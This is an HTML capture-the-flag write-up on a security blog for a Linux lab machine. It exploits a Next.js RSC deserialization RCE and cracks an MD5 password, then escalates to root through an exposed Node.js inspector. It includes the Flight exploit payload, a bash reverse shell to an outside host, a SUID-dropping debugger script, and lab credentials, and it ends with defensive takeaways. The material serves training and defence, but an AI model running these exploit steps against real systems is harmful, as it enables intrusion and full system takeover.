@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Reactor Writeup // Rahul Sharma</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600&display=swap">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <script src="../assets/js/theme.js"></script>
+</head>
+<body>
+
+<nav>
+  <div class="container nav-inner">
+    <div class="nav-logo"><a href="../index.html" style="color:inherit;">rahul<span>@sec</span>:~$</a></div>
+    <div class="nav-links">
+      <a href="../index.html">home</a>
+      <a href="../writeups.html" class="active">writeups</a>
+      <a href="../blog.html">blog</a>
+      <button id="theme-toggle" class="theme-toggle" type="button">☀</button>
+    </div>
+  </div>
+</nav>
+
+<div class="container">
+  <div class="page-header">
+    <div class="breadcrumb">
+      <a href="../index.html">~</a>
+      <span class="sep">/</span>
+      <a href="../writeups.html">writeups</a>
+      <span class="sep">/</span>
+      reactor
+    </div>
+
+    <div style="display:flex;align-items:center;gap:16px;margin-bottom:16px;margin-top:16px;">
+      <div style="font-size:2.5rem;">🐧</div>
+      <div>
+        <h1 style="margin-bottom:6px;">Reactor</h1>
+        <div style="display:flex;gap:8px;flex-wrap:wrap;">
+          <span class="badge badge-easy">Easy</span>
+          <span class="badge badge-linux">Linux</span>
+          <span class="badge badge-pwned">✓ Pwned</span>
+        </div>
+      </div>
+    </div>
+
+    <table style="width:auto;border-collapse:collapse;font-size:0.85rem;font-family:var(--font-mono);">
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">Date</td>
+        <td style="padding:4px 0;color:var(--text);">2026-05-25</td>
+      </tr>
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">OS</td>
+        <td style="padding:4px 0;color:var(--text);">Linux — Ubuntu 24.04</td>
+      </tr>
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">Stack</td>
+        <td style="padding:4px 0;color:var(--text);">Next.js 15.0.3 (React Server Components)</td>
+      </tr>
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">CVE</td>
+        <td style="padding:4px 0;color:var(--green);">CVE-2025-55182 (React2Shell, CVSS 10.0)</td>
+      </tr>
+    </table>
+  </div>
+
+  <div class="writeup-body">
+
+    <h2>Summary</h2>
+    <p>Reactor (themed as a "ReactorWatch" nuclear monitoring dashboard) teaches two very current attack chains:</p>
+    <ol style="margin-left:20px;margin-bottom:16px;color:var(--text);">
+      <li style="margin-bottom:6px;"><strong>Initial access</strong> — <code>CVE-2025-55182</code> ("React2Shell"), an unauthenticated RCE in the React Server Components Flight deserializer used by Next.js 15.0.3.</li>
+      <li style="margin-bottom:6px;"><strong>Credential discovery</strong> — environment variables point to a SQLite DB; an MD5 user hash cracks instantly → SSH as <code>engineer</code>.</li>
+      <li style="margin-bottom:6px;"><strong>Privilege escalation</strong> — a root Node.js process running with <code>--inspect</code> exposes the V8 debugger on localhost; an SSH tunnel + WebSocket payload runs JS as root.</li>
+    </ol>
+
+    <h2>Reconnaissance</h2>
+    <pre>nmap -sV -sC -p- 10.129.4.15
+22/tcp   open  ssh   OpenSSH 9.6p1
+3000/tcp open  http  Next.js 15.0.3 (ReactorWatch v3.2.1)</pre>
+    <p>Response headers betray the stack — and the attack surface:</p>
+    <pre>X-Powered-By: Next.js
+Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch</pre>
+    <p>The <code>Vary: RSC</code> header confirms React Server Components are active. Next.js 15.0.3 is below the patched 15.0.5 — vulnerable.</p>
+
+    <h2>Initial Foothold — CVE-2025-55182 (React2Shell)</h2>
+    <p>Disclosed Dec 2025 with a CVSS of 10.0, the bug lives in the RSC Flight protocol deserializer. A crafted payload abuses prototype pollution to reach the <code>Function()</code> constructor and execute server-side code with no auth. The Flight payload chains three references:</p>
+    <pre>{
+  "then": "$1:__proto__:then",
+  "status": "resolved_model",
+  "value": "{\"then\": \"$B1337\"}",
+  "_response": {
+    "_prefix": "process.mainModule.require('child_process').execSync('id');",
+    "_formData": { "get": "$1:constructor:constructor" }
+  }
+}</pre>
+
+    <p>The <code>NextRce</code> tool automates fingerprinting and exploitation:</p>
+    <pre>python3 NextRce.py -u http://10.129.4.15:3000 -c "id"
+[VULN] RCE SUCCESS  Output: uid=999(node) gid=988(node)</pre>
+
+    <p>Stage a reverse shell via a script in <code>/tmp</code> to dodge quoting issues:</p>
+    <pre>python3 NextRce.py -u http://10.129.4.15:3000 -c "echo 'bash -i >& /dev/tcp/10.10.15.27/4444 0>&1' > /tmp/s.sh"
+python3 NextRce.py -u http://10.129.4.15:3000 -c "chmod +x /tmp/s.sh"
+nc -lvnp 4444
+python3 NextRce.py -u http://10.129.4.15:3000 -c "bash /tmp/s.sh"</pre>
+
+    <h2>Post-Exploitation — Credentials</h2>
+    <pre>printenv
+DB_TYPE=sqlite3
+DB_PATH=/opt/reactor-app/reactor.db
+SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k
+
+strings /opt/reactor-app/reactor.db
+engineer  39d97110eafe2a9a68639812cd271e8e   (MD5)
+admin     a203b22191d744a4e70ada5c101b17b8   (MD5)</pre>
+    <p>MD5 is a fast, general-purpose hash — wholly unsuitable for passwords. <code>engineer</code> cracks in seconds (crackstation): <code>reactor1</code>.</p>
+    <pre>ssh engineer@10.129.4.15   # password: reactor1 → user.txt</pre>
+
+    <h2>Privilege Escalation — Node.js V8 Inspector</h2>
+    <pre>ps aux | grep node
+root 1384 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js</pre>
+    <p>A root process started with <code>--inspect</code> exposes the V8 debugger on <code>127.0.0.1:9229</code>. Anything evaluated through it runs as root. It's loopback-only, so tunnel in:</p>
+    <pre>ssh -L 9229:127.0.0.1:9229 engineer@10.129.4.15</pre>
+
+    <p>Query <code>/json</code> for the WebSocket URL, connect, and evaluate a payload that drops a SUID bash:</p>
+    <pre>node -e "
+const WebSocket = require('ws'), http = require('http');
+http.get('http://127.0.0.1:9229/json', res => {
+  let d=''; res.on('data',c=>d+=c); res.on('end',()=>{
+    const ws = new WebSocket(JSON.parse(d)[0].webSocketDebuggerUrl);
+    ws.on('open',()=>ws.send(JSON.stringify({id:1,method:'Runtime.evaluate',
+      params:{expression:\`process.mainModule.require('child_process')
+        .execSync('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')\`}})));
+    ws.on('message',m=>{console.log(m.toString());process.exit();});
+  });
+});"</pre>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="terminal-title">root shell</span>
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">engineer@reactor</span>:~$ <span class="t-cmd">/tmp/rootbash -p</span></div>
+        <div class="t-success">rootbash-5.2# whoami</div>
+        <div class="t-success">root</div>
+        <div><span class="t-prompt">rootbash-5.2#</span> <span class="t-cmd">cat /root/root.txt</span></div>
+      </div>
+    </div>
+
+    <h2>Flags</h2>
+    <div class="flag-box">
+      <div class="flag-label">User Flag — /home/engineer/user.txt</div>
+      <div class="flag-value">HTB{… redacted …}</div>
+    </div>
+    <div class="flag-box">
+      <div class="flag-label">Root Flag — /root/root.txt</div>
+      <div class="flag-value">HTB{… redacted …}</div>
+    </div>
+
+    <h2>Findings Summary</h2>
+    <table>
+      <thead><tr><th>Finding</th><th>Severity</th><th>Impact</th></tr></thead>
+      <tbody>
+        <tr><td>CVE-2025-55182: RSC Flight deserialization RCE</td><td><span class="severity-critical">Critical</span></td><td>Unauthenticated RCE as <code>node</code></td></tr>
+        <tr><td>Weak password hashing (MD5)</td><td><span class="severity-high">High</span></td><td>Credentials recovered in seconds</td></tr>
+        <tr><td>Node.js <code>--inspect</code> running as root</td><td><span class="severity-critical">Critical</span></td><td>Privilege escalation to root</td></tr>
+      </tbody>
+    </table>
+
+    <h2>Defensive Takeaways</h2>
+    <ul style="margin-left:20px;color:var(--text);line-height:2;">
+      <li><strong>Fingerprint and patch frameworks aggressively.</strong> <code>X-Powered-By</code> + a version in the JS bundle is all an attacker needs; <code>Vary: RSC</code> flags the vulnerable surface.</li>
+      <li><strong>Never use MD5/SHA1 for passwords.</strong> Use bcrypt, scrypt, or argon2 — intentionally slow, salted hashes.</li>
+      <li><strong><code>--inspect</code> in production is instant RCE.</strong> It's a dev tool; audit running Node processes for debug flags, especially under root.</li>
+      <li><strong>Loopback binding ≠ safe.</strong> Any local user (or SSH tunnel) reaches <code>127.0.0.1</code> services. More in my <a href="../blog/localhost-not-a-boundary.html">localhost notes</a>.</li>
+      <li><strong>Don't leak secrets via environment variables</strong> readable from a compromised app context.</li>
+    </ul>
+
+    <div style="margin-top:48px;padding-top:24px;border-top:1px solid var(--border);">
+      <a href="../writeups.html" class="btn btn-ghost">&larr; Back to Writeups</a>
+    </div>
+
+  </div>
+</div>
+
+<br><br>
+<footer>
+  <div class="container">
+    © 2026 <span>Rahul Sharma</span> &nbsp;·&nbsp; Security Engineer &nbsp;·&nbsp; HackTheBox writeups &amp; defensive security notes
+  </div>
+</footer>
+
+</body>
+</html>
